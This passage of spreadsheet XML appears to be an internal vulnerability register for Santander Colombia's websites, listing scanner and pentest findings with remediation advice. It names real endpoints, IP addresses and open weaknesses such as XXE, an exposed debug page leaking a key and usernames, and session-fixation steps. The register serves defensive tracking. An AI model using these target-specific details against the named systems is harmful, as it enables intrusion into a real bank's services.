- https://analytics.twitter.com/i/adsct?txn_id=nuum1&amp;p_id=Twitter&amp;tw_sale_amount=0&amp;tw_order_qua ntity=0 
- https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700,800 
- https://platform.twitter.com/oct.js - https://sb.scorecardresearch.com/c2/16058935/cs.js 
- https://sb.scorecardresearch.com/p?c1=2&amp;c2=16058935&amp;ns_site=santanderadvance&amp;name=&amp;ns_categor y=banco 
- https://t.co/i/adsct?txn_id=nuum1&amp;p_id=Twitter&amp;tw_sale_amount=0&amp;tw_order_quantity=0 
- https://www.facebook.com/tr?id=1685728391672672&amp;ev=PageView&amp;noscript=1 
- https://www.fogafin.gov.co/ 
- https://www.googletagmanager.com/ns.html?id=GTM-WNBLPF 
- https://www.youtube.com/iframe_api 
- https://www.youtube.com/player_api 
- https://www.images-home.com/image.js</t>
  </si>
  <si>
    <t>Cisco recomienda verificar la información revelada a todos los terceros y evitar compartir esa información a menos que sea un requisito comercial.</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200717_N</t>
  </si>
  <si>
    <t xml:space="preserve">Web Application Uses Unsafe Content Disposition For PDF Files  </t>
  </si>
  <si>
    <t>CWE-138: Improper Neutralization of Special Elements</t>
  </si>
  <si>
    <t>1ª Fecha 17/07/2020</t>
  </si>
  <si>
    <t>El Equipo descubrió que los archivos PDF se mostraban en el navegador, lo que exponía potencialmente a los usuarios a múltiples vulnerabilidades relacionadas de forma innecesaria.
Algunos archivos de ejemplo:
https://www.santander.com.co/recursos/archivos/aceptacion-condiciones.pdf 
https://www.santander.com.co/recursos/archivos/aviso-de-privacidad.pdf 
https://www.santander.com.co/recursos/archivos/bsnc-certificaciones-eeff-2018.pdf 
https://www.santander.com.co/recursos/archivos/bsnc-eeff-auditados-2018-2017.pdf 
https://www.santander.com.co/recursos/archivos/bsnc-eeff-y-notas-marzo-19.pdf 
https://www.santander.com.co/recursos/archivos/bsnc-informe-de-gestion-2018.pdf 
https://www.santander.com.co/recursos/archivos/bsnc-sfc-2013.pdf 
https://www.santander.com.co/recursos/archivos/canales-atencion-amv.pdf
[TRUCATED]</t>
  </si>
  <si>
    <t xml:space="preserve">Cisco recomienda que se modifique la forma en que se accede a los documentos PDF para que los usuarios se vean obligados a descargar los documentos PDF en lugar de abrirlos en su navegador. Esto puede lograrse añadiendo un encabezado de Disposición de Contenido a una solicitud de un documento PDF con el tipo establecido en "adjunto"
disposición de contenido: adjunto;
Nota: En el sitio web de Adobe se pueden encontrar más consejos sobre cómo añadir un encabezado de Disposición de contenido, así como información sobre la propia vulnerabilidad.
</t>
  </si>
  <si>
    <t xml:space="preserve">Web Application Uses Insecure Transmission For Login Forms  </t>
  </si>
  <si>
    <t>CWE-319: Transmission of Sensitive Information In Plain Text</t>
  </si>
  <si>
    <t>The Team discovered that sensitive content was transmitted over the plain text protocol HTTP.</t>
  </si>
  <si>
    <t>Cisco recommends that the web application is reconfigured to run over an encrypted protocol such as HTTPS, which should be configured to use trusted certificates and the strongest cipher suites supported by the intended client base. It is important to ensure that no content within the application is accessed via HTTP, as an attacker could exploit this to inject code that would disclose any sensitive content on the affected pages.</t>
  </si>
  <si>
    <t>BSNC-2020-006</t>
  </si>
  <si>
    <t xml:space="preserve">Web Application Does Not Specify Content Security Policy (CSP) </t>
  </si>
  <si>
    <t>CWE-673: External Influence of Sphere Definition</t>
  </si>
  <si>
    <t>El Equipo observó que el servidor web no daba instrucciones al navegador del usuario para que restringiera las fuentes desde las que se permitía cargar los activos (por ejemplo, scripts, estilos, imágenes o marcos).
No se devolvió un encabezamiento HTTP similar al siguiente en respuesta a las solicitudes.
Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src 'self'; style-src ' self'; frame-src 'self'</t>
  </si>
  <si>
    <t>Cisco recomienda que se utilice la función de Política de Seguridad de Contenidos (CSP) para mejorar la resistencia a los ataques de Cross-site Scripting, prohibiendo el uso de scripts y estilos en línea y limitando las fuentes de activos permitidos a las ubicaciones de confianza. Cuando se implementa correctamente, CSP puede mitigar todos los ataques de Cross-site Scripting, excepto los más sofisticados.
Nota: Para una protección efectiva, no se deben utilizar scripts o estilos en línea en las páginas, y en su lugar se deben mover a sus propios archivos.</t>
  </si>
  <si>
    <t xml:space="preserve">Plantean riesgos de seguridad para los usuarios de Internet y los gestores de páginas web y pueden manipularse, por ejemplo, mediante el Cross Site Scripting. </t>
  </si>
  <si>
    <t>The Team observed that the web server did not instruct the user's browser to restrict the sources from which assets (for example, scripts, styles, images or frames) were allowed to be loaded.
An HTTP header similar to the following was not returned in response to requests:
Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src 'self'; style-src ' self'; frame-src 'self'</t>
  </si>
  <si>
    <t>Cisco recommends that the Content Security Policy (CSP) feature be used to improve resistance to Cross-site Scripting attacks by banning the use of inline scripts and styles, and limiting allowed asset sources to trusted locations. When implemented correctly, CSP can mitigate all but the most sophisticated Cross-site Scripting attacks.
Note: For effective protection, no inline scripts or styles should be used in pages, and should instead be moved to their own files.</t>
  </si>
  <si>
    <t>‘Robots.txt’ File Discloses Information</t>
  </si>
  <si>
    <t>El Equipo descubrió que el archivo '/robots.txt' contenía directorios utilizados para controlar los robots de los motores de búsqueda que rastrean los sitios web en busca de información.
El contenido de robots.txt : : 
User-agent: * 
Disallow: /*?* 
Sitemap: https://es.santanderadvance.com/sitemaps/sitemap.xml
https://www.santander.com.co/robots.txt</t>
  </si>
  <si>
    <t>Cisco recomienda que '/robots.txt' sea eliminado a menos que sea absolutamente necesario. Cabe señalar que los motores de búsqueda sólo seguirán los enlaces accesibles, por lo que un método válido para evitar que se indexen las zonas sensibles del sitio es simplemente no incluir los URL sensibles en ninguna de las páginas con enlaces públicos. Si la información presentada por la aplicación no está destinada al consumo público, también es posible sustituir el contenido de '/robots.txt' por el texto que figura a continuación, lo que impedirá que los robots de los motores de búsqueda indexen cualquier contenido de la página:
User-agent: * 
Disallow: *
Alternativamente, el archivo '/robots.txt' puede ser reemplazado usando el encabezado X-Robots-Tag Header. En el directorio que no debe ser indexado por los motores de búsqueda, cree un archivo .htaccess e introduzca lo siguiente en él:
Header set X-Robots-Tag "noindex, nofollow"</t>
  </si>
  <si>
    <t>BSNC-2020-007</t>
  </si>
  <si>
    <t xml:space="preserve">‘X-Content-Type-Options’ HTTP Header Not Specified </t>
  </si>
  <si>
    <t>El Equipo observó que el servidor web no daba instrucciones al navegador del usuario para que no adivinara el tipo de MIME de un archivo por medio del "content sniffing".
Una cabecera HTTP similar a la siguiente no se devolvía en respuesta a las solicitudes::
X-Content-Type-Options: nosniff</t>
  </si>
  <si>
    <t>Cisco recomienda que el servidor web esté configurado para añadir el siguiente encabezado HTTP "X-Content-Type-Options":
X-Content-Type-Options: nosniff</t>
  </si>
  <si>
    <t>se produzca un ataque basado en confusión de tipos mime.</t>
  </si>
  <si>
    <t>The Team observed that the web server did not instruct the user's browser not to guess the MIME type of a file via content sniffing.
An HTTP header similar to the following was not returned in response to requests:
X-Content-Type-Options: nosniff</t>
  </si>
  <si>
    <t>Cisco recommends that the web server is configured to add the following ‘X-Content-Type-Options’ HTTP header:
X-Content-Type-Options: nosniff</t>
  </si>
  <si>
    <t xml:space="preserve">‘X-XSS-Protection’ HTTP Header Not Specified </t>
  </si>
  <si>
    <t>CWE-693: Protection Mechanism Failure</t>
  </si>
  <si>
    <t>No X-XSS-Protection header was set in the response.</t>
  </si>
  <si>
    <t>Cisco recommends that the web server is configured to add the ‘X-XSS-Protection’ HTTP header as follows:
X-XSS-Protection: 1; mode=block</t>
  </si>
  <si>
    <t>Infraestructura</t>
  </si>
  <si>
    <t>bsncp201bck.cosan.corp</t>
  </si>
  <si>
    <t>QA-18026094337</t>
  </si>
  <si>
    <t>Apache Tomcat Remote Code Execution Vulnerability</t>
  </si>
  <si>
    <t>CVE-2019-0232</t>
  </si>
  <si>
    <t>180.26.138.201</t>
  </si>
  <si>
    <t>El proveedor ha publicado las siguientes correcciones de seguridad relacionadas con esta vulnerabilidad:
- Apache Tomcat 9.0.18 o posterior
- Apache Tomcat 8.5.40 o posterior
- Apache Tomcat 7.0.93 o posterior
Se puede encontrar más información en Tomcat</t>
  </si>
  <si>
    <t>Cuando se ejecuta en Windows con enableCmdLineArguments habilitado, el Servlet CGI en Apache Tomcat 9.0.0.M1 a 9.0.17, 8.5.0 a 8.5.39 y 7.0.0 a 7.0.93 es vulnerable a la ejecución remota de código debido a un error en la forma en que el JRE pasa los argumentos de la línea de comandos a W</t>
  </si>
  <si>
    <t>Synack</t>
  </si>
  <si>
    <t>helicopterblizzard-4</t>
  </si>
  <si>
    <t xml:space="preserve">XXE in https://141.226.106.45/factoringWSOccidente-factoringWSOccidente/ConsultarProductoOcciclienteServiceAction </t>
  </si>
  <si>
    <t>141.226.106.45</t>
  </si>
  <si>
    <t xml:space="preserve">XXE en https://141.226.106.45/factoringWSOccidente-factoringWSOccidente/ConsultarProductoOcciclienteServiceAction: # Descripción del problema:
- XXE en la aplicación https://141.226.106.45/f usando la API de SOAP, que se confirmó usando un requerimiento de DNS ciego
</t>
  </si>
  <si>
    <t>Análisis correcto del XML en la API SOAP.</t>
  </si>
  <si>
    <t>Enumeración de archivos verificando si la aplicación tiene errores o no
Posible exfiltración (sin el firewall)</t>
  </si>
  <si>
    <t>QA-1701704568</t>
  </si>
  <si>
    <t>jQuery Prior to 3.4.0 Cross-Site Scripting Vulnerability</t>
  </si>
  <si>
    <t>CVE-2019-11358</t>
  </si>
  <si>
    <t>El vendedor ha recomendado actualizar jquery a la versión 3.4.0
&lt;P&gt; Parche: &lt;BR&gt;
Los siguientes son enlaces para descargar parches para corregir las vulnerabilidades:
&lt;P&gt; &lt;A HREF="https://jquery.com/download/" TARGET="_blank"&gt; jQuery &lt;/A&gt;</t>
  </si>
  <si>
    <t>Un atacante puede aprovechar este problema para ejecutar código de script arbitrario en el navegador de un usuario desprevenido en el contexto del sitio afectado. Esto puede permitir al atacante robar credenciales de autenticación basadas en cookies y lanzar otros ataques.</t>
  </si>
  <si>
    <t>Despedida</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_R</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_N_01</t>
  </si>
  <si>
    <t>MAN-b3582c9b</t>
  </si>
  <si>
    <t>CO-20-CNMPO-004-AP-001</t>
  </si>
  <si>
    <t>Versión vulnerable y sin soporte de Richfaces</t>
  </si>
  <si>
    <t>CVE-2018-14667
CVE-2018-12533
CVE-2013-2165</t>
  </si>
  <si>
    <t>1ª Fecha: 28/07/2020
2ª Fecha: 18/12/2020</t>
  </si>
  <si>
    <t>1ª Fecha: 18/12/2020
2ª Fecha: 18/12/2021</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha identificado que la aplicación web utiliza el framework Richfaces con una versión vulnerable.</t>
  </si>
  <si>
    <t>Se recomienda cambiar de framework a uno que mantenga el soporte de los desarrolladores.</t>
  </si>
  <si>
    <t>Los CVEs asociados a la versión de Richfaces identificada, permiten la ejecución de código remoto mediante vulnerabilidades de deserialización e inyección de código EL. Un atacante podría aprovecharse de estas vulnerabilidades para conseguir acceso total al servidor. Además, la Richfaces ya no tiene soporte por los desarrolladores oficiales. Por lo tanto, las nuevas vulnerabilidades que se encuentren en el framework no serán corregidas.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">2/05/2022
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>29/01/2021</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">Gestores: </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">BOT envió propuesta que hizo el equipo de Heinsohn sobre actualización del Front para dar solución a la vulnerabilidad con un tiempo de atención de 18 meses, BOT manifiesta que Heinsohn tiene una propuesta para dar solución a la vulnerabilidad dentro de dos meses (Enero) mientras se trabaja este desarrollo. Se debe concertar reunión con el equipo de CiberSeguridad para plantear esta opción.
Pendiente fecha de compromiso. 
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">21 de febrero ambiente previo  </t>
    </r>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200728_N_02</t>
  </si>
  <si>
    <t>MAN-b3582c9c</t>
  </si>
  <si>
    <t>CO-20-CNMPO-004-AP-002</t>
  </si>
  <si>
    <t>Versión vulnerable de iText</t>
  </si>
  <si>
    <t>CVE-2017-9096</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha identificado que en el servidor se está utilizando la versión 2.1.2 de la librería iText.
Se muestran los metadatos de uno de los ficheros descargables de la aplicación web.</t>
  </si>
  <si>
    <t>Se recomienda actualizar la versión de la librería iText a la más actual que esté disponible.</t>
  </si>
  <si>
    <t>Un atacante puede analizar el resto de la aplicación para identificar alguna funcionalidad que permita interactuar con la librería para explotar la vulnerabilidad pública CVE-2017-9096, causando una inyección de código XML y causando una ejecución de código remoto.</t>
  </si>
  <si>
    <t>MAN-b3582c9d</t>
  </si>
  <si>
    <t>CO-20-CNMPO-004-AP-003</t>
  </si>
  <si>
    <t>Acceso a información de debug</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha identificado que el aplicativo web tiene habilitado el acceso a la página de debug. Esta página contiene información sobre los componentes que forman la aplicación web. Además, se ha identificado nombres de usuario y la clave de cifrado de jCryption.
La página de debug se encuentra en:
• https://confirming-factoring.santander.com.co/factoring/common/mainPages/debug.seam</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar el acceso a la página de debug. Si fuera necesario el acceso por parte de algunos usuarios, se recomienda únicamente permitir el acceso a los usuarios autenticados y con permisos específicos.</t>
  </si>
  <si>
    <t>Un atacante puede utilizar la información expuesta para realizar ataques más específicos y buscar nuevos vectores de ataque. Por ejemplo, se podría descifrar la información cifrada con la clave jCryption, realizar ataques de fuerza bruta sobre los usuarios descubiertos y ataques de password spraying.</t>
  </si>
  <si>
    <t>MAN-b3582c9e</t>
  </si>
  <si>
    <t>CO-20-CNMPO-004-AP-004</t>
  </si>
  <si>
    <t>Enumeración de usuarios</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas a la página de Login, se ha identificado diferentes tipos de error en función de sí el usuario existe o no existe.
Es posible obtener los usuarios registrados en la aplicación web en base a los diferentes errores que muestra el aplicativo. Estos errores son diferentes en función de si el usuario introducido es válido o no.</t>
  </si>
  <si>
    <t>Un atacante puede obtener un listado de los usuarios de la aplicación con el objetivo de utilizar dicha información para planificar y generar ataques de mayor impacto. Como por ejemplo ataques de fuerza bruta sobre usuarios existentes para descubrir las contraseñas o ataques de password spraying.</t>
  </si>
  <si>
    <t>Se recomienda modificar los mensajes de error presentados al usuario para que no proporcionen información sobre la existencia del usuario. Un posible mensaje podría ser "El usuario y/o la contraseña introducidos no son válidos" tanto para usuarios incorrectos como para contraseñas incorrectas.</t>
  </si>
  <si>
    <t>BitSight</t>
  </si>
  <si>
    <t>Encabezados ineficaces: Content-Security-Policy, Set-Cookie , Encabezados obligatorios faltantes
Encabezados http faltantes: Cache-Control</t>
  </si>
  <si>
    <t>Fair</t>
  </si>
  <si>
    <t>Encabezado no configurado</t>
  </si>
  <si>
    <t>El valor recomendado es : no-cache, no-store</t>
  </si>
  <si>
    <t>Encabezados ineficaces: Content-Security-Policy, Set-Cookie , Encabezados obligatorios faltantes
Encabezados http faltantes: Content-Security-Policy</t>
  </si>
  <si>
    <t>El valor recomendado es: Default-src ‘self’; font-src *; img-src * data:; script-src *; style-src *;</t>
  </si>
  <si>
    <t>A2 20190509_2.3.1.c_CO_20200612_N_07</t>
  </si>
  <si>
    <t>Encabezados ineficaces: Content-Security-Policy, Set-Cookie , Encabezados obligatorios faltantes
Encabezados mal configurados: Set-Cookie</t>
  </si>
  <si>
    <t>Actualmente el encabezado tiene configurada 2 veces la directriz “Secure”</t>
  </si>
  <si>
    <r>
      <t>Es necesario dejar la directriz "Secure" una solo vez, ya que esta duplicada.
Set-Cookie: JSESSIONID=B47D01A6F57E45591F781CC2C34440A2; Path=/;</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> </t>
    </r>
    <r>
      <rPr>
        <b/>
        <u/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Secure</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>; HttpOnly;</t>
    </r>
    <r>
      <rPr>
        <b/>
        <u/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Secure</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>QA-WAS-1acb63c5-3233-425f-bfc8-96552785b739</t>
  </si>
  <si>
    <t>Path-relative stylesheet import (PRSSI) vulnerability</t>
  </si>
  <si>
    <t>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
css/ie.css
Referencias:
Inyección maligna de CSS
Ataque de sobrescritura de la ruta relativa
Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobreescritura de ruta relativa</t>
  </si>
  <si>
    <t>Se recomienda eliminar las URL relativas y utilizar las URL absolutas en las importaciones de CSS.
Las siguientes alternativas pueden aplicarse para evitar las vulnerabilidades de PRSSI.
- Establecer un DOCTYPE que no permita el modo Quirks como se explica en https://hsivonen.fi/doctype/
- Establecer el encabezado de respuesta X-Frame-Opciones:deny
- Ajustar el encabezado de respuesta X-Content-Type-Opciones: nosniff
- Definir una etiqueta base HTML para especificar la URL base para todas las URLs relativas de un documento.</t>
  </si>
  <si>
    <t>Desestimada</t>
  </si>
  <si>
    <t>QA-WAS-d45bbbd3-f49f-49cb-8479-507eecbe0d00</t>
  </si>
  <si>
    <t>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
https://www.santander.com.co/index.html
Referencias:
Inyección maligna de CSS
Ataque de sobre escritura de la ruta relativa
Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobre escritura de ruta relativa</t>
  </si>
  <si>
    <t>QA-WAS-aba2d8a7-ab19-4b75-89a6-afc7e842a53e</t>
  </si>
  <si>
    <t>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
css/ie.css
Referencias:
Inyección maligna de CSS
Ataque de sobre escritura de la ruta relativa
Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobre escritura de ruta relativa</t>
  </si>
  <si>
    <t>Supernet</t>
  </si>
  <si>
    <t>QA-WAS-aa2ef8c4-9df0-41fd-a294-deeb44539638</t>
  </si>
  <si>
    <t>www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F</t>
  </si>
  <si>
    <t>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
App_Themes/Login/Login.css?v=H20150511_1205
App_Themes/Default/Default.css?v=H20150511_1205
App_Themes/Common/blockScreen/blockScreen.css?v=H20150615_1800
App_Themes/Login/Login.css
Ruta: https://www.santander.com.co/Web/Login.aspx
Referencias:
Inyección maligna de CSS
Ataque de sobre escritura de la ruta relativa
Un trabajo de investigación: Análisis a gran escala de la inyección de estilo por sobre escritura de ruta relativa</t>
  </si>
  <si>
    <t>1ª Fecha: 19/08/2021
2ª Fecha: 26/11/2021
3ª Fecha: 25/01/2021
4ª Fecha: 04/02/2022
5ª Fecha: 04/03/2022</t>
  </si>
  <si>
    <t>QA-WAS-5509ff08-2bbe-4f1a-8835-20208a01660c</t>
  </si>
  <si>
    <t>Slow HTTP POST vulnerability</t>
  </si>
  <si>
    <t>La aplicación web es posiblemente vulnerable a un ataque de denegación de servicio (DoS) "HTTP POST" lento. Se trata de un DoS a nivel de aplicación que consume los recursos del servidor al mantener las conexiones abiertas durante un período de tiempo prolongado enviando lentamente el tráfico al servidor. Si el servidor mantiene demasiadas conexiones abiertas a la vez, entonces puede no ser capaz de responder a nuevas conexiones legítimas. A diferencia de los ataques DoS que consumen ancho de banda, el ataque "lento" no requiere que se envíe una gran cantidad de tráfico al servidor, sólo que el cliente sea capaz de mantener conexiones abiertas durante varios minutos a la vez.
El ataque mantiene las conexiones del servidor abiertas enviando cabeceras HTTP POST debidamente elaboradas que contienen una cabecera de longitud de contenido con un gran valor para informar al servidor web de la cantidad de datos que puede esperar. Después de que las cabeceras HTTP POST se envían completamente, el cuerpo del mensaje HTTP POST se envía a velocidades lentas para prolongar la finalización de la conexión y bloquear los recursos del servidor. Al esperar el cuerpo completo de la solicitud, el servidor está ayudando a los clientes con conexiones lentas o intermitentes a completar las solicitudes, pero también se está exponiendo al abuso.
Puede encontrar más información en BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf.</t>
  </si>
  <si>
    <t xml:space="preserve">La solución sería específica para cada servidor, pero las recomendaciones generales lo son:
- limitar el tamaño de la solicitud aceptable a los requisitos de cada formulario
- establecer una tasa de velocidad mínima aceptable
- establecer un tiempo límite de solicitud absoluto para la conexión con la solicitud POST
Los detalles específicos del servidor se pueden encontrar aquí. 
Una herramienta que demuestra esta vulnerabilidad de una manera más intrusiva está disponible aquí.
</t>
  </si>
  <si>
    <t>QA-WAS-58773e20-1268-4acf-8004-7859031e1be0</t>
  </si>
  <si>
    <t>Use of JavaScript Library with Known Vulnerability</t>
  </si>
  <si>
    <t>La aplicación web utiliza una o más bibliotecas de JavaScript que contienen una vulnerabilidad conocida.
https://www.santander.com.co/Web/Scripts/jquery-3.4.1.min.js
jQuery 3.4.1 -&gt; VULNERABLE</t>
  </si>
  <si>
    <t>Por favor, consulte los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca.</t>
  </si>
  <si>
    <t>QA-WAS-e36b3d6f-ac29-4ece-9847-1ce41a552e4d</t>
  </si>
  <si>
    <t>Path-Based Vulnerability</t>
  </si>
  <si>
    <t xml:space="preserve">Un archivo, directorio o listado de directorio potencialmente sensible fue descubierto en el servidor Web.
Vulnerabilidad reportada por no disponer de un  error genérico, que no dé lugar a conocer si los recursos son, o no, accesibles, pudiendo ocasionar en un mapeo de la página completo conociendo los errores para recursos existentes pero no accesibles desde un usuario externo.
o Ejemplo, recurso legitimo:
 https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/admin.php 
o Recurso no legitimo: 
 https://confirming-factoring.santander.com.co/factoring/a4j/g/3_3_3.Final/org/ajax4jsf/Javiadmin.php
</t>
  </si>
  <si>
    <t>Verifique que el acceso a este archivo o directorio esté permitido. Si es necesario, elimínelo o aplíquele controles de acceso.</t>
  </si>
  <si>
    <t>QA-WAS-215654f1-cbaa-4a67-af2a-184711b78f68</t>
  </si>
  <si>
    <t>Un archivo, directorio o listado de directorio potencialmente sensible fue descubierto en el servidor Web.
se tratan de recursos accesibles a y con login expuestos.
Redirección de la url: https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2fWeb%2fApp_Themes%2fLogin%2fWebService%2f</t>
  </si>
  <si>
    <t>Verifique que el acceso a este archivo o directorio esté permitido. Si es necesario, elimínelo o aplíquele controles de acceso.
En esta vulnerabilidad tendrían que confirmar si se tratan de recursos accesibles de forma legítima y si estos paneles de login son públicos y se encuentran en conocimiento de acceso para cualquier persona externa. En caso afirmativo, podríamos dar estos dos casos como falsos positivos, en caso negativo, recomendamos redirigir estas dos URL que aparentemente no son controladas a un error genérico, que, como comentamos, no dé lugar a conocimiento de si son parte, o no, del árbol de directorios de la web.</t>
  </si>
  <si>
    <t>QA-WAS-1c4c4302-fab0-4350-9c9e-a883e9ce8bd3</t>
  </si>
  <si>
    <t>HTTP Request Smuggling</t>
  </si>
  <si>
    <t>La vulnerabilidad de Contrabando de Solicitudes HTTP (HRS) existe cuando hay discrepancias en el análisis de las solicitudes HTTP. 
El flujo de solicitudes HTTP que se origina en un cliente puede ser manejado por diferentes entidades antes de que lleguen al servidor backend. 
Las entidades implicadas pueden ser cualquiera de las siguientes:
- Proxy HTTP, 
- servidor de caché,
- equilibrador de carga,
- servidor web, etc. 
Lógica de detección:
Para detectar esta vulnerabilidad estamos manipulando la petición http enviando juntos content_length y transfer_encoding headers.</t>
  </si>
  <si>
    <t xml:space="preserve">Compruebe las entidades HTTP (por ejemplo, el proxy HTTP, el servidor de caché, el equilibrador de carga, el servidor web, etc.) que participan en el flujo de solicitudes http de la aplicación escaneada. 
Una de las entidades HTTP involucradas en su flujo de solicitudes es vulnerable al contrabando de solicitudes HTTP. 
Actualice esa entidad a la última versión o haga los cambios de configuración adecuados para evitar la vulnerabilidad.
</t>
  </si>
  <si>
    <t>QA-WAS-549746f5-4621-435a-822c-7d4327b29d44</t>
  </si>
  <si>
    <t>La aplicación web utiliza una o más bibliotecas de JavaScript que contienen una vulnerabilidad conocida.
https://www.santander.com.co/js/jquery-3.5.1.slim.min.js
jQuery 3.1.1 -&gt; VULNERABLE</t>
  </si>
  <si>
    <t>MAN-22939e24</t>
  </si>
  <si>
    <t>CO-20-CNMPO-007-CO-001</t>
  </si>
  <si>
    <t>Robo de sesión por fijación de sesión</t>
  </si>
  <si>
    <t>Es posible realizar un robo de sesión aprovechando la fijación de sesión y el envío de IDs de sesión por la URL, para ello se requiere que el usuario abra un enlace con un buscador que no tiene cookies para la aplicación.
Si no hay jsession cookie y se solicita que una página fuerce una redirección, se enviará adicionalmente la cookie de sesión en la url, despues del carácter ";".
La cookie de sesión no se reinicia al hacer login, de modo que la cookie de sesión enviada en la url sigue estando activa despues del login, identificando y autorizando al usuario
Esto puede ocasionar un robo de sesión, por ejemplo, en el siguiente escenario:
• Un atacante envía a la víctima un enlace interno de la aplicación, que fuerza una redirección:
https://confirming-factoring.santander.com.co/factoring/basico/administrarEntidades/administrarEntidadesList.seam
• Si la víctima accede al enlace con un buscador que no tiene cookies para el dominio, la web redirigirá al usuario al login creando una nueva sesión y enviándola en la URL, el atacante podría acceder a esta información, por ejemplo, si la víctima está utilizando un proxy o el atacante tiene acceso a su historial.
La víctima inicia sesión, dando acceso a su cuenta al ID de sesión de la cookie que controla el atacante. Del mismo modo el atacante tiene que obtener el valor del parámetro "FACTBOTTKNCSR", que se envía en la URL una vez autenticado
• El atacante utiliza la cookie robada y el parámetro FACTBOTTKNCSR para conseguir acceso a su cuenta y obtener o modificar los datos.</t>
  </si>
  <si>
    <t>Para eliminar la fijación de sesión se tiene que forzar al servidor o a la aplicación a renovar el ID de sesión cuando el usuario hace login, invalidando la sesión anterior. También se debe solucionar la fuga de información de los IDs de sesión por la URL: • La cookie de sesión JsessionID se muestra en la URL si el servidor recibe una petición que resulta en una redirección. Se deberia forzar al servidor a eliminar ese ID de la URL. • El ID de sesión del parámetro get "FACTBOTTKNCSR" se puede enviar también usando el método POST o en una cabecera de la petición HTTP.</t>
  </si>
  <si>
    <t>Un atacante puede engañar a un usuario para que acceda a un enlace mediante este método y robar los datos de la sesión. Obteniendo control de la sesión y teniendo acceso a la aplicación como el usuario legítimo.</t>
  </si>
  <si>
    <t>MAN-22939e25</t>
  </si>
  <si>
    <t>CO-20-CNMPO-007-CO-002</t>
  </si>
  <si>
    <t>Posible Denegación de Servicio</t>
  </si>
  <si>
    <t xml:space="preserve">Es posible ralentizar el servicio mediante request smuggling, forzando la división de las peticiones en el servidor.
El servicio se puede obstaculizar o denegar utilizando diferentes payloads (endspacex-if, xnprespace-1f, endspacexn-1f...) que dividen las peticiones recibidas por la aplicación o el balanceador de carga e impiden o ralentizan el acceso de otros usuarios.
</t>
  </si>
  <si>
    <t>La solución a esta vulnerabilidad no es trivial, ya que depende de la infraestructura interna y de cómo se están interpretando las peticiones, las siguientes soluciones se pueden tener en cuenta: 
• Deshabilitar las optimizaciones que permitan esta vulnerabilidad. 
• Añadir un Firewall de aplicación (WAF) o un filtro previo a la aplicación que filtre estos payloads.</t>
  </si>
  <si>
    <t>Un atacante puede bloquear el acceso a la aplicación a uno o múltiples usuarios durante un tiempo indefinido.</t>
  </si>
  <si>
    <t>MAN-22939e27</t>
  </si>
  <si>
    <t>CO-20-CNMPO-007-CO-003</t>
  </si>
  <si>
    <t>Inyección del header Host</t>
  </si>
  <si>
    <t xml:space="preserve">La aplicación confía en la cabecera de Host de la petición recibida, pudiendo ser modificada por el
usuario.
La aplicación confía en la cabecera de Host de la petición recibida, pudiendo ser modificada por el
usuario. Este dato puede ser utilizado para redirigir al usuario a un dominio no controlado por la
entidad, para construir enlaces o para generar peticiones internas, que pasarían a ser controladas
por el usuario.
Este dato se puede obtener internamente sin tener que confiar en el dato recibido en la petición.
</t>
  </si>
  <si>
    <t>El valor del Host debe obtenerse internamente en la aplicación, sin tener que confiar en una cabecera que puede ser modificada.</t>
  </si>
  <si>
    <t>En este caso sólo se ha conseguido redirigir a el usuario al dominio indicado en la cabecera enviada, pero podría provocar más vulnerabilidades si se utiliza ese valor en otras funcionalidades, por ejemplo si se usa para construir URLs en el proceso de recuperación de contraseña.</t>
  </si>
  <si>
    <t>MAN-e70f8b9f</t>
  </si>
  <si>
    <t>SCO-20-CNMPO-06-AP-001</t>
  </si>
  <si>
    <t>Enumeracion de usuarios</t>
  </si>
  <si>
